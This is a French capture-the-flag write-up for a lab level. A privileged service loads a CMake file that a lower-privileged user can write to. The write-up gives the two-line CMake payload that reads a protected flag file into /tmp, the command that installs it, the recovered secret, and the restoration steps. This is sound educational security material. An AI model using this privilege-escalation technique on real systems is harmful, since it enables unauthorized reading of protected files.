# Level03 — Faire exécuter un script CMake

## Objectif

Comprendre comment un service privilégié peut exécuter des instructions contrôlées par un utilisateur moins privilégié. La faille repose sur la confiance accordée à un fichier CMake modifiable.

## 1. Lire l’indice

```bash
cat README
```

Résultat :

```text
Every Burbclave has rules. Find the loophole.
```

Le mot `Burbclave` fournit une piste. La commande suivante retrouve le service correspondant :

```bash
systemctl list-unit-files | grep -i burbclave
```

Cette commande complète la démarche de découverte. Sa sortie originale reste à ajouter aux notes.

## 2. Étudier le service et les permissions

```bash
id
systemctl cat burbclave.service
ls -ld /var/lib/burbclave/staging
```

Les observations conservées établissent trois faits importants :

1. `level03` appartient au groupe `burbclave` et peut écrire dans le dossier `staging` ;
2. le service charge un fichier nommé `build.cmake` depuis ce dossier ;
3. le service s’exécute sous l’identité `flag03`.

La chaîne de confiance peut être résumée ainsi :

```text
level03
  └─ écrit build.cmake
       └─ chargé par burbclave.service
            └─ exécuté avec les droits de flag03
                 ├─ lit /home/flag03/.flag
                 └─ écrit /tmp/level03_recovered
```

Le service possède, grâce à l’identité `flag03`, le droit de lire `/home/flag03/.flag`.

## 3. Comprendre le script CMake

Le fichier [build.cmake](build.cmake) ne contient que deux instructions :

```cmake
file(READ "/home/flag03/.flag" SECRET)
file(WRITE "/tmp/level03_recovered" "${SECRET}")
```

| Instruction | Effet |
| --- | --- |
| `file(READ ... SECRET)` | Lire `.flag` et placer son contenu dans la variable CMake `SECRET`. |
| `file(WRITE ... "${SECRET}")` | Écrire cette variable dans un fichier que `level03` pourra consulter. |

CMake sert habituellement à configurer la construction de programmes, et son langage permet également de manipuler des fichiers. Les deux instructions présentées réalisent toute l’opération.

## 4. Sauvegarder puis installer le script

Avant toute modification, vérifier si le fichier cible existe déjà :

```bash
ls -l /var/lib/burbclave/staging/build.cmake
```

S’il existe, le sauvegarder avant de continuer :

```bash
cp /var/lib/burbclave/staging/build.cmake /tmp/build.cmake.bak
sha256sum /tmp/build.cmake.bak
```

Installer ensuite le script :

```bash
cat > /var/lib/burbclave/staging/build.cmake <<'EOF'
file(READ "/home/flag03/.flag" SECRET)
file(WRITE "/tmp/level03_recovered" "${SECRET}")
EOF
```

Dans cette construction :

- `>` remplace le contenu du fichier cible ;
- `<<'EOF'` fournit plusieurs lignes à `cat` ;
- les apostrophes autour de `EOF` empêchent Bash d’interpréter `${SECRET}` avant CMake.

## 5. Attendre l’exécution du service

Les notes indiquent que le service est déclenché périodiquement par un timer. Pour identifier les timers et leur prochain passage :

```bash
systemctl list-timers --all
```

Après le passage du service, lire le fichier produit :

```bash
cat /tmp/level03_recovered
```

Le contenu récupéré est :

```text
b209ea91ad7a5c2a0b0f4e195ca4
```

Le fichier apparaît après le déclenchement du timer. Consulter la liste des timers permet de connaître le prochain passage avant de relire la sortie.

## 6. Restaurer l’état initial

Si un fichier `build.cmake` existait avant le test, le restaurer et comparer son empreinte à celle de la sauvegarde :

```bash
cat /tmp/build.cmake.bak > /var/lib/burbclave/staging/build.cmake
sha256sum /tmp/build.cmake.bak /var/lib/burbclave/staging/build.cmake
rm -f /tmp/build.cmake.bak
```

S’il n’existait pas, retirer uniquement le fichier créé pour le test :

```bash
rm -f /var/lib/burbclave/staging/build.cmake
```

Supprimer enfin le fichier de sortie si les permissions le permettent :

```bash
rm -f /tmp/level03_recovered
```

Les notes de résolution confirment que le script et le fichier temporaire ont été supprimés de la VM après vérification.

## 7. Passer à `level04`

```bash
su - level04
```

Saisir le secret comme mot de passe, puis vérifier l’identité obtenue :

```bash
id -un
```

Résultat attendu : `level04`. Le passage au compte suivant a réussi avec le secret récupéré, également conservé dans `level03/flag`.

## Pourquoi cette méthode fonctionne

Le service exécute avec les droits de `flag03` un script situé dans un emplacement modifiable par `level03`. Le contrôle du fichier d’instructions permet donc indirectement d’effectuer des opérations autorisées pour `flag03`.

L’exécution doit être déclenchée par le service afin que les instructions CMake bénéficient des droits de `flag03`. Une exécution directe conserverait les droits de `level03`.

## À expliquer à l’évaluation

> J’ai vérifié que `level03` pouvait modifier le fichier CMake chargé par un service exécuté sous `flag03`. J’ai fourni deux instructions : l’une lit le flag, l’autre l’écrit dans un fichier accessible. Le service a exécuté ces instructions avec ses propres droits. J’ai ensuite restauré l’état initial et validé le secret avec `level04`.

## Traçabilité à conserver

Conserver les sorties de `id`, `systemctl cat`, `ls -ld`, `systemctl list-timers`, des commandes `sha256sum` et de `id -un`. Elles démontrent respectivement le droit d’écriture, l’identité du service, son déclenchement, la restauration et la validation finale.
